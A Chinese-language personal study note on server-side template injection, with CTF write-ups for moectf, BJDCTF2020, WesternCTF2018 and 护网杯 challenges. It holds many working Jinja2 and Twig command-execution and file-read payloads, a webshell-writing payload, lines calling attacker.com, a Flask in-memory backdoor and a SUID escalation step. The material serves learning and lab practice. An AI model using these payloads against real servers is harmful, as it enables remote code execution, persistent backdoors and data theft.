---
title: "sstizhuru"
date: 2026-01-21 19:39:43
disableNunjucks: true
categories: 默认分类
tags: [笔记]
---

# 模板注入初步[¶](https://hello-ctf.com/hc-web/ssti/#_1)

> [ProbiusOfficial/Hello-CTF](https://github.com/ProbiusOfficial/Hello-CTF)

## 前置知识[¶](https://hello-ctf.com/hc-web/ssti/#_2)

在开始之前，我们先大概介绍一下什么是模板，什么又是模板注入。

### 什么是模板[¶](https://hello-ctf.com/hc-web/ssti/#_3)

**模板** 是一种用于生成动态内容的工具。  

它们通常包含两个基本部分：

比如下图为 Hello-CTFtime 项目中，渲染比赛列表的时候用到的模板：

**绿色** 部分为 **静态内容** ，而 **橙色** 部分则是 **动态占位符** 

![image-20231128133158187](https://hello-ctf.com/hc-web/assets/image-20231128133158187.png)

大多数模板的工作流程：

**定义模板  ->  传递数据  -> 渲染模板  -> 输出生成**

![image-20231128135756055](https://hello-ctf.com/hc-web/assets/image-20231128135756055.png)

### 什么是模板注入[¶](https://hello-ctf.com/hc-web/ssti/#_4)

我们之前在说SQL注入的时候，这样描述SQL注入 “**通过可控输入点达到非预期执行数据库语句**”，比如后台预期的语句是：

```
SELECT username,password FROM users WHERE id = "数据传递点"
```

在预期情况下，数据传递点只会是 1，2，3，4......

但是我们要是让数据传入点的值为 `1" union select 1,group_concat(schema_name) from information_schema.schemata --`

后台执行的语句就变成了：

```
SELECT username,password FROM users WHERE id = "1" union select 1,group_concat(schema_name) from information_schema.schemata --"
```

这时候不仅会查询 `id=1`的数据，还会把所有数据库的名字一同查询出来。



同样的 **「模板注入 SSTI(Server-Side Template Injection)」** 也一样，**数据传递\**就是可控的输入点，以 \**Jinja2** 举例，Jinja2 在渲染的时候会把`{{}}`包裹的内容当做变量解析替换，所以当我们传入 `{{表达式}}` 时，表达式就会被渲染器执行。

比如下面的示例代码：

```
from flask import Flask
from flask import request
from flask import render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    template = '''
    <p>Hello %s </p>''' % (request.args.get('name'))
    return render_template_string(template)

if __name__ == '__main__':

    app.run()
```

当我们传入 {{9*9}} 时他会帮我们运算后输出 81

![image-20231128141012093](https://hello-ctf.com/hc-web/assets/image-20231128141012093.png)

## Python模板注入一般流程[¶](https://hello-ctf.com/hc-web/ssti/#python)

> 注意模板注入是一种方式，它不归属于任何语言，不过目前遇见的大多数题目还是以python的SSTI为主，所以我们用 Python SSTI 为例子带各位熟悉模板注入。

一般我们会在疑似的地方尝试插入简单的模板表达式，如 `{{7*7}}` `{{config}}`，看看是否能在页面上显示预期结果，以此确定是否有注入点。

当然本来还需要识别模板的，但大多数题目都是 Jinja2 就算，是其他模板，多也以Python为主，所以不会差太多，所以我们这里统一用 Jinja 来讲。

### 引[¶](https://hello-ctf.com/hc-web/ssti/#_5)

很多时候，你在阅读SSTI相关的WP时，你会发现最后的payload都差不多长下面的样子：

```
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}
......
```



逻辑：

比如我们现在就只拿到了 A，但我们想读取目录下面的 flag ，于是就有了下面的尝试：

**找对象A的类 - 类A** -> **找类A的父亲 - 类B** -> **找祖先/基类 - 类O**  -> **遍历祖先下面所有的子类** -> **找到可利用的类 类F 类G**->  **构造利用方法**->  **读写文件/执行命令**

**拿基类 -> 找子类 -> 构造命令执行或者文件读取负载 -> 拿flag** 是python模板注入的正常流程。









### 来来来，分类，什么时候用什么请看好

不要像我一样把python的用到php里面了，



1. **Jinja2 (Python):** `{{7*7}}` 会得到 `49`，但 `{{7*'7'}}` 会得到 `7777777`（字符串重复）。



```
{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}
{{ lipsum.__globals__['os'].popen('env').read() }}
{{ request.application.__globals__["__builtins__"]["__import__"]("os").popen("env").read() }}
{% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('env').read()"))%}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('env').read()") }}{% endif %}{% endfor %}
{{self.__init__.__globals__.__builtins__.open('/flag').read()}}
```



2. **Twig (PHP):** `{{7*7}}` 会得到 `49`，而 `{{7*'7'}}` 也会得到 **`49`**。

- **原理：** PHP 是弱类型语言，在进行算术运算时，它会自动把字符串 `'7'` 转换为数字 `7`。

payload：



```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```



```
1. 命令执行类 (RCE)
Twig

{{["cat /flag"]|map("system")|join(",")}}
{{["cat /flag", 0]|sort("system")|join(",")}}
{{["cat /flag"]|filter("system")|join(",")}}
{{[0, 0]|reduce("system", "cat /flag")|join(",")}}
{{['cat /flag']|filter('system')}}

2. 文件读取类 (无命令执行时)
Twig

{{'/flag'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/flag','')}}{{app.request.files.get(1).openFile.fread(99)}}

3. 环境篡改与后门类
Twig

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

4. 木马写入类
Twig

{{{"<?php echo file_get_contents('/flag');?>":"/var/www/html/f.php"}|map("file_put_cont
```







3. **Smarty (PHP):** 通常只支持 `{7*7}`（单大括号）。







## 细讲twig注入：

### 1. 测试流程

1. 检测注入点 → 2. 判断沙盒状态 → 3. 尝试基础Payload → 4. 绕过沙盒 → 5. 提权



### 漏洞利用与Payload

### 1. 非沙盒模式

#### 命令执行（需`exec`函数可用）

```
{{['id']|filter('system')}}       
{{['cat /flag']|map('system')}}

```

#### 文件读取

```
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.read(1000)}}
```

#### 利用`_self`对象（旧版本）

```
{{_self.env.setCache("ftp://attacker.com")}}
{{_self.env.loadTemplate("恶意模板")}}
```

### 2. 沙盒绕过技巧

#### 使用内置过滤器链

```
{{['id']|filter('system')|join(',')}}  <!-- 绕过黑名单检查 -->
```

#### 利用属性注入

```
{{app.request.query.filter('system','id')}}
```

#### 模板继承攻击

```
{% extends "http://attacker.com/malicious.twig" %} 
```

### 3. 其他Payload

• **信息泄露**：

```
{{app.request.server.all|join(',')}}  <!-- 泄露服务器变量 -->
{{_self}}                             <!-- 转储_self对象 -->
```

• **XSS利用**：

```
{{''}}       <!-- 需关闭自动转义 -->
```

------

## 四、防御手段

### 1. 官方推荐

• **启用沙盒模式**：

```
$policy = new \Twig\Sandbox\SecurityPolicy([], [], [], [], []);
$twig->addExtension(new \Twig\Extension\SandboxExtension($policy, true));
```

• **输入过滤**：避免用户输入直接控制模板内容。
• **禁用危险函数**：在`php.ini`中禁用`system`、`exec`等函数。

### 2. 安全配置

• 更新至最新版本（≥Twig 3.x）。
• 使用白名单限制模板可访问的类和方法。
• 避免动态拼接模板内容。

------

## 五、绕过技巧

### 1. 字符串拼接

```
{{['id']|filter('sy'~'stem')}}
```

### 2. 利用`attribute`函数

```
{{attribute(_self, 'env')}}  <!-- 访问受限属性 -->
```

### 3. 上下文逃逸

```
{% set cmd = 'id' %}
{{{cmd:['system']}|json_encode}}  <!-- 利用JSON解析漏洞 -->
```

------





## moectf web 20 第二十章 幽冥血海·幻语心魔

怎么判断是不是ssti？

输入{{7*7}}，他甚至会帮你计算

举例：因为Jinja2 在渲染的时候会把`{{}}`包裹的内容当做变量解析替换，所以当我们传入 `{{表达式}}` 时，表达式就会被渲染器执行。



方法一：url拼接

通用：

```
{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}
{{ lipsum.__globals__['os'].popen('env').read() }}
{{ request.application.__globals__["__builtins__"]["__import__"]("os").popen("env").read() }}
{% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('env').read()"))%}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('env').read()") }}{% endif %}{% endfor %}
{{self.__init__.__globals__.__builtins__.open('/flag').read()}}
```



方法二：fenjing梭哈

http://127.0.0.1:42803/?password=iwantflag为什么是这个

http://127.0.0.1:50032/?username=1&password=1 这个才是原格式

为什么不按照原格式来呢



| URL 类型                              | 作用                      | 核心特点                                             |
| ------------------------------------- | ------------------------- | ---------------------------------------------------- |
| 原格式 `50032/?username=1&password=1` | 正常访问漏洞页面的 “示例” | `username`/`password`都是 “固定值”，无注入           |
| 利用格式 `42803/?password=iwantflag`  | 漏洞利用的 “基础 URL”     | 仅保留必填的`password`固定值，留`username`作为注入位 |



### 因为`username` 要留作 “注入位”，不能写死为`1`

原始格式的 `username=1` 是 “固定值”，但漏洞利用的核心是**把`username`的值换成 SSTI Payload**：

- 如果照搬原始格式写成 `?username=1&password=iwantflag`，`username` 被固定为`1`，无法注入 Payload；

- 所以只保留 

  ```
  password=iwantflag
  ```

  得

  ```
  http://127.0.0.1:42803/?password=iwantflag&username=恶意Payload
  ```

  passwd和usern位置反了？

  “passwd 和 username 位置反了” 其实**完全不影响漏洞利用**——URL 参数的核心是「键值对存在且值正确」，而非「参数的先后顺序」

  参考前面介绍里面的图，可以发现顺序不重要。

  

  

  具体fenjing使用页面：图片删了





## 21 第二十一章 往生漩涡·言灵死局



输入{{7*7}}提示错误，知道被绕过

以此类推发现__和globals也被绕过





1. `{{`  `}}`  ->   `{% print() %}` 

2. `__` 和 `globals`  ->` '_''_''glo''bals''_''_'`

3. 关于点访问和数组访问

   | 写法 1（点访问）     | 写法 2（数组访问）      |      |
   | -------------------- | ----------------------- | ---- |
   | `lipsum.__globals__` | `lipsum['__globals__']` |      |







方法一:

原：

`{{ lipsum.__globals__['os'].popen('env').read() }}`



现：

```
{% print(lipsum['_''_glo''bals_''_']['os'].popen('env').read()) %}
{% print(lipsum['_''_''glo''bals''_''_']['os'].popen('env').read()) %}
```









方法二：fejing



使用指南：

进入env文件夹后打开终端，输入：



激活命令：

& ".\Scripts\Activate.ps1"

启动网页命令：

python -m fenjing webui





网页参数填写：

原：http://127.0.0.1:2775/?username=1&password=1





输入urlhttp://127.0.0.1:2775/?password=1



请求方式：get

表单输入：username

分析模式：快速

指令：cat /flag















## moectf web 22 第二十二章 血海核心·千年手段





```
{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}
```





知识点：

1.Flask ：

是 Python 的**轻量级 Web 框架**，核心作用是：帮你用几行 Python 代码，快速搭一个能通过浏览器访问的网站（服务器）。



1.1Flask 的一个核心特点：**每次收到用户请求，都会按顺序执行 “钩子函数”+ 视图函数**（比如`before_request`就是 “请求来之前先执行的函数”）。





2.内存马：

内存马 = **只存在于 服务器运行内存中 的后门**（没有文件落地，而且服务器重启就会消失），核心是「偷偷给 Web 程序加一个 “隐藏功能”，只有你知道怎么触发」。

用生活例子类比：

- 正常情况：你去奶茶店（服务器），只能点菜单上的饮品（正常功能）；
- 内存马：你偷偷和奶茶店员工（Web 程序）说 “以后我来只要说暗号‘QwQ’，你就帮我拿后厨的可乐（执行命令）”—— 这个 “暗号→拿可乐” 的规则，只存在员工脑子里（内存），没有写在菜单上（无文件），只有你知道，其他人不会发现。



### 1+2：核心：WAF 只认 “直接干坏事” 的请求，不认 “偷偷埋雷 + 后期触发” 的操作

1. **直接执行命令（被拦）**：

你直接跟服务器说 “帮我执行 cat /flag”，WAF 一眼就看出来你要干坏事，直接把你拦住，服务器根本收不到你的请求。

2. **内存马（不被拦）**：

- 第一步（埋雷）：你跟服务器说 “以后只要我传参数 a，你就执行 a 里的内容”—— 这话听起来就是 “设置一个规则”，没有直接说要读 flag，WAF 觉得你只是正常配置，服务器记住了这个规则（雷埋好了）；
- 第二步（踩雷）：你再跟服务器说 “a=cat /flag”—— 这话看起来就是 “传一个普通参数 a，值是 cat /flag”，WAF 只看到你传了个参数，不知道服务器早就记了 “执行 a 里内容” 的规则，就又放行了；
- 结果：服务器收到 “a=cat /flag” 后，按之前埋的规则执行了命令，拿到 flag，但 WAF 全程没发现你在干坏事。









3.内存马构造



```python
{{url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('a')).read())")}}
```









- `url_for.__globals__`：Flask 内置函数`url_for`的全局变量空间（能拿到 Flask 的核心对象`app`）；

- `__builtins__['eval']`：Python 的内置执行函数（用来执行后面的字符串代码）；

- `app.before_request_funcs`：Flask 的 “请求前钩子”——**每次收到 HTTP 请求，先执行这个钩子里的函数**；

- append(lambda: ...)：往钩子里加一个匿名函数，逻辑是：

  

  1.接收 GET 参数

  ```
  a
  ```

  （比如你传

  ```
  ?a=whoami
  ```

  ）；

  

  2.执行

  ```
  os.popen(参数a)
  ```

  （运行系统命令）；

  

  3.读取命令执行结果

  ```
  read()
  ```





4.提权：“SUID 提权” 

利用 setuid 位的`rev`程序



1. SUID 位：临时拥有程序所有者（通常是 root）的权限

    

2. 谁有suid位？找 SUID 程序

    

   ```
   find / -perm -4000 2>/dev/null
   ```

   （遍历系统，找带 SUID 位的文件，忽略错误输出），只找到

   ```
   /usr/bin/rev
   ```

   

3. 什么是rev？

   rev 程序的特殊之处：

   

   题目里说/usr/bin有 rev 的 C 源码（核心是 rev 被设置了 SUID，且源码里有漏洞 / 特殊逻辑）

   ```plaintext
   ?a=cat /usr/bin/rev.c&password=1
   ```

   

   源码

   ```
   int main(int argc, char **argv) {
       // 遍历命令行参数（从第1个参数开始，跳过程序名argv[0]）
       for (int i = 1; i + 1 < argc; i++) {
           // 判断当前参数是否是定制的--HDdss
           if (strcmp("--HDdss", argv[i]) == 0) {
               // 执行--HDdss后面的命令（核心：放弃反转字符串，执行外部命令）
               execvp(argv[i + 1], &argv[i + 1]);
           }
       }
       return 0;
   }
   ```

   `execvp` 是 Linux/Unix 系统下 C 语言的**进程替换函数**

   大白话讲：它的作用是「用一个新的命令 / 程序，替换当前正在运行的程序进程（rev）

   

   

   

4. 拿 flag

   用内存马执行

   ```
   rev --HDdss cat /flag
   ```

   

- `rev`以 root 权限运行（因为 SUID 位）；
- `--HDdss`是 rev 的特殊参数，让它执行后面的`cat /flag`（相当于用 root 权限读 /flag）；
- `rev`本身是 “反转字符串” 的命令，但这里是题目定制的版本，加参数后能执行其他命令。





5.rev反转字符串

普通用法下（比如`rev test.txt`），它还是会反转字符串；但只要加了`--HDdss`这个出题人自定义的参数，代码里的逻辑就会 “走岔路”—— 跳过反转字符串的代码块，执行 “执行外部命令” 的代码块。









1.构造内存马

2.注入内存马

3.传参a=ls /和whoami





输入：http://127.0.0.1:10745/?a=ls%20/&password=1

得到：flag

```
app bin boot dev entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 
```





![image-20251224203920593](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251224203920593.png)



为什么不传cat /flag？因为whoami之后会发现你不是root，需要提权才能cat /flag







4.找到能提权的指令，然后后面跟特殊定制版命令，最后加上cat /flag

4.1找到rev

4.2rev.c查看源代码，发现有定制版rev

4.3输入：

http://127.0.0.1:10745/?a=rev --HDdss cat /flag&password=1







![image-20251224203954397](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251224203954397.png)

![image-20251224204057314](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251224204057314.png)









第一道由我自己找到思路的题目！！！！！！！！！

## [BJDCTF2020]Cookie is so stable

### 1 第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。



1.很正常的网站，进去之后后看了flag.php index.php的源码，并没有任何发现

唯一有的就是一个登陆页面，没有密码，只要输账号，然后我试了sql和万能密码，都没有用

于是想到每次输进去都会有显示：hello，xxx



好吧，我瞎了，看了题解发现

![image-20251227115027878](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251227115027878.png)





2.考虑ssti，输入{{7*7}}

发现惊喜！！！！！！！！

![image-20251227135455493](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251227135455493.png)



3.

输入{{ lipsum.__globals__['os'].popen('env').read() }}发现没有显示了，想到可能被过滤掉了

于是一个一个试，轮到{{ lipsum.}}发现显示为：

## What do you want to do?!



试了好几个，都是这样，发现都被过滤，换种思路？cookie？





4.cookie，题目有提示的



抓个包看看



![屏幕截图 2025-12-27 135344](C:\Users\21709\Pictures\Screenshots\屏幕截图 2025-12-27 135344.png)





**Cookie**: **PHPSESSID**=**380b3509ce71b831ed6a431a408cb503**; **user**=**1**



谢天谢地，原来注入点在这里呜呜呜呜



```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```











## [WesternCTF2018]shrine

### 1

打开就是源码





```  import flask
import flask
import os

app = flask.Flask(__name__)

# [疑点 1: Flag 在哪？]
# 从系统环境变量拿走 FLAG 存入 app 的 config 字典里。
# 以后只能通过 app.config['FLAG'] 访问，系统里已经没这个环境变量了。
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    # [疑点 2: 首页显示什么？]
    # __file__ 指向当前这个 py 文件。访问首页就读取并显示这段源码。
    # 所以你才能在网页上看到这些代码。
    return open(__file__).read()

# [疑点 3: 路由和变量怎么来的？]
# <path:shrine> 就像个捕获器，URL 后面跟着什么，变量 shrine 就是什么。
@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        # [疑点 4: 为什么要删括号？]
        # 把 () 删掉是为了防止你通过 Python 语法调用函数，比如 .read()
        s = s.replace('(', '').replace(')', '')
        
        # [疑点 5: config 和 self 哪里来的？]
        # 这是程序员手动定义的“黑名单”列表，里面存了两个他想封杀的词。
        blacklist = ['config', 'self']
        
        # [疑点 6: 拼接是怎么实现的？]
        # 这一行其实是：
        # 1. 循环 blacklist 里的词。
        # 2. 生成 "{{% set config=None%}}{{% set self=None%}}" 这样两句禁令。
        # 3. 最后加上你输入的字符串 s (即参数 shrine)。
        prefix = ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])
        return prefix + s

    # [疑点 7: 为什么能执行代码？]
    # render_template_string 是核心，它会把字符串当成 Jinja2 模板执行。
    # 它收到的内容是：[禁令] + [你输入的内容]。
    # 因为禁令在前，如果你直接写 {{config}}，只会得到 None。
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```



```
import flask
import os

app = flask.Flask(__name__)

# [核心目标]：Flag 被存放在了 app 的 config 里面
app.config['FLAG'] = os.environ.pop('FLAG')


//os.environ：这是一个字典，里面存着你电脑/服务器上所有的“环境变量”（比如系统用户名、路径等）。

//pop('FLAG')：这是字典的一个操作。它的意思是：把名字叫 FLAG 的那个值拿出来，并从环境变量里彻底删掉。


@app.route('/')


//@app.route('/') 是什么意思？

    //在 Flask 里，这叫“路由装饰器”。

    //它告诉服务器：“如果有用户访问网站的‘根目录’（即网站首页，/），就请执行下面那个名为 index() 的函数。”

    //所以当你打开浏览器输入 http://127.0.0.1:5000/，你看到的内容就是 index() 函数返回的东西。


def index():							
	//这是的函数就是上面路由需要执行的函数了
	
    # 访问根目录时，直接把这段代码读出来显示在网页上
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')  //有人输入这个url就会执行下面的函数

<path:shrine>：这是一个捕获器。它告诉 Flask，门牌号 /shrine/ 后面跟着的任何东西，都把它装进一个叫 shrine 的信封里，交给下面的函数处理。


def shrine(shrine):
    def safe_jinja(s):
        # [限制 1]：把括号 ( ) 替换为空，这意味着你不能调用任何函数（如 .read()）
        s = s.replace('(', '').replace(')', '')
        
        # [限制 2]：黑名单，不准直接使用 config 和 self 这两个变量名
        blacklist = ['config', 'self']
        
        # [混淆操作]：在你的 Payload 前面强行加上 {{% set config=None %}}
        # 这会导致你在模板里直接写 {{ config }} 拿不到任何东西
        prefix = ''.join(['{{% set {}=None %}}'.format(c) for c in blacklist])
        
        //1.' ... {} ... '.format('config') ：
        Python 只盯着那一对孤零零的大括号 {}。它看到 .format('config')，就立刻把 'config' 塞进那个坑里。
        //2.''.join([...])里面的''是啥意思：
''.join(['A', 'B', 'C'])		"ABC"	就像用无形胶水粘在一起
'-'.join(['A', 'B', 'C'])		"A-B-C"	用横杠作为粘合剂
' 和 '.join(['A', 'B', 'C'])		"A 和 B 和 C"	用文字作为粘合剂
        
        
        return prefix + s
        //进行拼接

    # [漏洞点]：render_template_string 会解析并执行用户传入的字符串
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```



### 为什么 `current_app.config` 还能用？

在编程中，`config` 这个词出现在不同的地方，意义完全不同：

- **作为独立变量名：** `{{ config }}` —— 这个被你代码里的 `set config=None` 废掉了。
- **作为对象的属性：** `current_app.config` —— 这里的 `config` 是 `current_app` 这个对象内部的一个**属性（Key）**。



- 当你访问 `current_app.config` 时：
  1. 模板引擎先找到了 `current_app` 这个对象（它不在黑名单里）。
  2. 然后去读取这个对象内部的 `config` 属性。
  3. 这个属性指向的是内存中真实的配置字典，它**没有**被改成 `None`。





1.构造payload

需要通过一个“绕路”的 Payload 来找回被设为 None 的 `config`（里面有flag）

**推荐 Payload：**

```
/shrine/{{ url_for.__globals__['current_app'].config['FLAG'] }}
```

`url_for`：这是一个 Flask 自带的函数，代码没禁用它。

`.__globals__`：获取这个函数运行时的全局环境。

`['current_app']`：在全局环境里找到当前正在运行的这个 `app` 对象。

`.config['FLAG']`：既然找到了 `app`，自然就能点出它的 `config`，从而拿到 Flag。













## [护网杯 2018]easy_tornado

### 1

一进去三个连接：

```
/flag.txt
/welcome.txt
/hints.txt
```



**第一步：观察**



点击获得：

1.

```
/welcome.txt<br>render
```

说明这里是一个ssti注入模板。

在 Python 的 Web 开发（特别是 Tornado、Flask、Django）中，`render` 系列函数的功能是：**将代码逻辑和 HTML 模板“缝合”在一起。**

- **正常用法：** 程序员写死模板，只让你填数据（如用户名）。
- **漏洞用法：** 程序员把**你输入的内容**直接丢进 `render` 函数里处理。

由于 `render` 具有**执行指令**的能力，如果你输入了 `{{ ... }}` 格式的内容，`render` 就会把它当成代码去执行，而不是当成普通的文字显示。



2.

```
/hints.txt<br>md5(cookie_secret+md5(filename))
```

处理逻辑：把文件名md5和cookie拼接起来，然后再整体md5



3.

```
/flag.txt<br>flag in /fllllllllllllag
```

找到文件名

md5(cookie_secret+md5(3bf9f6cf685a6dd8defadabfb41a03a1))

还差cookie



4.还得到了三个url

```
GET /file?filename=/welcome.txt&filehash=1b63a9ae097b47187135a844d4eafcfd
GET /file?filename=/flag.txt&filehash=a52b1928deff4c626d099883429dbcb4
GET /file?filename=/hints.txt&filehash=637657bcdc2a447924cb73ee504343f2
```

那么我们发现：

第一，是小写32位哈希；

第二，MAC（Message Authentication Code，消息认证码）：所有我们传入的文件名都会和cookie一起md5解析，若被服务器验证正确，你就可以读取想要的文件。



**第二步：找cookie**

抓包并没有发现cookie，但是我们可以通过报错得到一些信息，或许信息里面就有cookie ？



知识点：Tornado 框架的特性 (The Key)

每一个 Web 框架在处理模板时，都会默认提供一些**内置对象**。

- 在 **Tornado** 框架中，模板引擎可以直接访问一个叫 `handler` 的对象。

- **`handler` 对象：** 

  它代表了当前处理请求的实例，它能够访问到整个 `application` 的设置。（所有的配置信息cookie_secret`都存储在 `self.`application`.settings里面。）

  访问方式：可以通过 `handler.settings` 访问



这里的逻辑是：

先找到一个可以注入的入口，然后放进去 handler.setting ，通过回显拿到cookie



怎么找入口（也就是可以打印和处理你输入的页面）？：

**利用“报错重定向”发现入口**

- **在主页乱传参：** 无效。因为主页的后端代码（Handler）没写读取参数的功能
- **在 `/file` 传参：** 有效。这里的后端代码**必须**处理 `filename`。当你传一个不存在的 `aaa` 或错误的 `hash` 时，代码运行出错，触发了“异常处理”。
- **发现重定向：** 服务器自动把你踢到了 `/error?msg=Error`。这说明 `/error` 页面专门负责显示错误信息。

利用报错重定向回显：如果你乱传参的话，他就没办法处理你的输入，那么就会把东西都扔到一个专门处理错误的地方。





通过/file?filename=传入aaa，可以得到处理错误的地址：

```
/error?msg=Error
```

那么就得到了这个入口，进去之后的msg就是注入点

![image-20260118094751344](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260118094751344.png)



我们试试其他：

![image-20260118094913939](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260118094913939.png)

![image-20260118094946270](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260118094946270.png)

说明有过滤



但是没关系，试试看handler.settings

![image-20260118095107239](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260118095107239.png)

得到cookie！

0ba70d95-2474-4ced-b2e4-52d8473aca2a



按照之前的处理逻辑拼接加编码即可：

md5(cookie_secret+md5(3bf9f6cf685a6dd8defadabfb41a03a1))

```
d6c816597dd95fed7b3e9e6b1a5976ad

url：
/file?filename=/fllllllllllllag&filehash=d6c816597dd95fed7b3e9e6b1a5976ad
```





